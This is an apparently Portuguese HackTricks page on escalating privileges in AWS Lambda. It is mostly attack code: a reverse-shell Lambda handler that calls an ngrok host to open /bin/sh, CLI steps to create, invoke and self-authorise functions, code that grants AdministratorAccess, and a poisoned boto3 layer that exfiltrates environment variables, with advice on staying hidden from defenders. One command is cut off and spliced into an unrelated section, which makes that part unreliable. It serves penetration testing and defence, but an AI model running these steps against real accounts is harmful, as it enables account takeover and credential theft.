# AWS - Privesc do Lambda

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## lambda

Mais informa√ß√µes sobre lambda em:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Um usu√°rio com as permiss√µes **`iam:PassRole`, `lambda:CreateFunction`** e **`lambda:InvokeFunction`** pode **escalar privil√©gios passando uma fun√ß√£o IAM existente para uma nova fun√ß√£o Lambda** que inclui c√≥digo para importar a biblioteca AWS relevante para sua linguagem de programa√ß√£o de escolha e, em seguida, us√°-la para executar a√ß√µes de sua escolha. O c√≥digo poderia ent√£o ser executado invocando a fun√ß√£o atrav√©s da API da AWS.

Um atacante poderia abusar disso para obter um **rev shell e roubar o token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('4.tcp.ngrok.io',14305))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```
{% endcode %}

```bash
# Compacte o rev shell
zip "rev.zip" "rev.py"

# Crie a fun√ß√£o
aws lambda create-function --function-name my_function \
    --runtime python3.9 --role <arn_of_lambda_role> \
    --handler rev.lambda_handler --zip-file fileb://rev.zip

# Execute a fun√ß√£o
aws lambda invoke --function-name my_function output.txt
## Se voc√™ tiver a permiss√£o lambda:InvokeFunctionUrl, precisar√° expor a fun√ß√£o em uma URL e execut√°-la por meio da URL

# Liste as fun√ß√µes
aws iam list-attached-user-policies --user-name <user-name>
```

Voc√™ tamb√©m pode **abusar das permiss√µes da fun√ß√£o lambda** a partir da pr√≥pria fun√ß√£o lambda.\
Se a fun√ß√£o lambda tiver permiss√µes suficientes, voc√™ poder√° us√°-la para conceder direitos de administrador a voc√™:

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Impacto potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda especificada.

{% hint style="danger" %}
Observe que, mesmo que possa parecer interessante, **`lambda:InvokeAsync`** **n√£o permite por si s√≥ executar `aws lambda invoke-async`**, voc√™ tamb√©m precisa de `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como no cen√°rio anterior, voc√™ pode **conceder a si mesmo a permiss√£o `lambda:InvokeFunction`** se tiver a permiss√£o **`lambda:AddPermission`**

```bash
# Verifique o exploit anterior e use a seguinte linha para conceder as permiss√µes de invoca√ß√£o
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
   --action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```

**Impacto potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda especificada.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Um usu√°rio com as permiss√µes **`iam:PassRole`, `lambda:CreateFunction`** e `lambda:CreateEventSourceMapping` (e possivelmente `dynamodb:PutItem` e `dynamodb:CreateTable`), mas **sem** a permiss√£o `lambda:InvokeFunction`, pode escalar privil√©gios **passando uma fun√ß√£o IAM existente para uma nova fun√ß√£o Lambda** que inclui c√≥digo para importar a biblioteca AWS relevante para sua linguagem de programa√ß√£o de escolha e, em seguida, us√°-la para executar a√ß√µes de sua escolha. Eles ent√£o precisariam **criar uma tabela DynamoDB ou usar uma existente** para **criar um mapeamento de fonte de eventos para a fun√ß√£o Lambda apontando para essa tabela DynamoDB**. Em seguida, eles precisariam **colocar um item na tabela** ou esperar que outro m√©todo o fa√ßa para que a **fun√ß√£o Lambda seja invocada**.

```bash
aws lambda create-function --function-name my_function \
    --runtime python3.8 --role <arn_of_lambda_role> \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://rev.zip
```

Onde o **c√≥digo** no arquivo python **utilizaria a fun√ß√£o IAM**. Um exemplo seria o mesmo script usado nos m√©todos anteriores.

Depois disso, o pr√≥ximo passo depende de **se o DynamoDB est√° sendo usado** no ambiente AWS atual. **Se** estiver sendo **usado**, tudo o que precisa ser feito √© **criar o mapeamento de fonte de eventos** para a fun√ß√£o Lambda, mas se n√£o, o atacante precisar√° **criar uma tabela com streaming habilitado** com o seguinte comando:

```bash
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType
#### Explora√ß√£o

**Anexar uma camada a uma fun√ß√£o** requer apenas a permiss√£o `lambda:UpdateFunctionConfiguration` e **as camadas podem ser compartilhadas entre contas**. Tamb√©m precisar√≠amos saber **quais bibliotecas eles est√£o usando**, para que possamos substitu√≠-las corretamente, mas neste exemplo, vamos **assumir que a fun√ß√£o atacada est√° importando o boto3**.

Apenas para garantir, vamos usar o Pip para instalar a mesma vers√£o da biblioteca boto3 do tempo de execu√ß√£o do Lambda que estamos visando (Python 3.7), para que n√£o haja nada diferente que possa causar problemas na fun√ß√£o de destino. O tempo de execu√ß√£o atualmente usa a vers√£o 1.9.42 do boto3.

Com o seguinte c√≥digo, instalaremos a vers√£o 1.9.42 do boto3 e suas depend√™ncias em uma pasta local "lambda\_layer":

```
pip3 install -t ./lambda_layer boto3==1.9.42
```

Em seguida, abriremos `/lambda_layer/boto3/__init__.py` e adicionaremos o c√≥digo malicioso. O payload que adicionaremos parece com isso:

![](<../../../.gitbook/assets/image (26).png>)

`requests` est√° sendo importado de `botocore`. A fun√ß√£o exfiltrar√° as vari√°veis de ambiente, e o try-except e o timeout de 0,1 est√£o l√° para garantir que este c√≥digo n√£o quebre nada.

{% hint style="info" %}
**Nota importante:** Voc√™ n√£o deve mais usar `from botocore.vendored import requests` em testes de penetra√ß√£o reais, porque um "DeprecationWarning" ser√° impresso nos logs do CloudWatch daquela fun√ß√£o, o que provavelmente far√° com que voc√™ seja descoberto por um defensor.
{% endhint %}

Agora, empacote esse c√≥digo em um **arquivo ZIP** e **fa√ßa o upload** para uma **nova camada Lambda na conta do ATACANTE**. Voc√™ precisar√° criar uma pasta "python" primeiro e colocar suas bibliotecas l√° para que, uma vez que a carregarmos no Lambda, o c√≥digo seja encontrado em "/opt/python/boto3". Al√©m disso, certifique-se de que a camada seja compat√≠vel com o Python 3.7 e que a **camada esteja na mesma regi√£o que nossa fun√ß√£o de destino**. Depois disso, usaremos `lambda:AddLayerVersionPermission` para **tornar a camada publicamente acess√≠vel** para que nossa conta de destino possa us√°-la. Use suas credenciais pessoais da AWS para esta chamada de API.

```bash
aws lambda add-layer-version-permission --layer-name boto3 \
    --version-number 1 --statement-id public \
    --action lambda:GetLayerVersion --principal *
```

Agora, com as **credenciais comprometidas** que temos, executaremos o seguinte comando em nossa fun√ß√£o Lambda de destino "s3-getter", que **anexar√° nossa camada Lambda entre contas**.

```
aws lambda update-function-configuration \
    --function-name s3-getter \
    --layers arn:aws:lambda:REGI√ÉO:ID-DA-NOSSA-CONTA:layer:boto3:1
```

O pr√≥ximo passo seria **invocar a fun√ß√£o** n√≥s mesmos, se pudermos, ou esperar at√© que ela seja **invocada por meios normais** - que √© o m√©todo mais seguro.

Uma **maneira mais furtiva de explorar essa vulnerabilidade** pode ser encontrada em:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda usada.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Talvez com essas permiss√µes voc√™ possa criar uma fun√ß√£o e execut√°-la chamando a URL... mas n√£o consegui encontrar uma maneira de test√°-la, ent√£o me avise se voc√™ conseguir!

### Lambda MitM

Algumas lambdas v√£o **receber informa√ß√µes sens√≠veis dos usu√°rios em par√¢metros**. Se conseguir RCE em uma delas, poder√° exfiltrar as informa√ß√µes que outros usu√°rios est√£o enviando para ela, verifique em:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>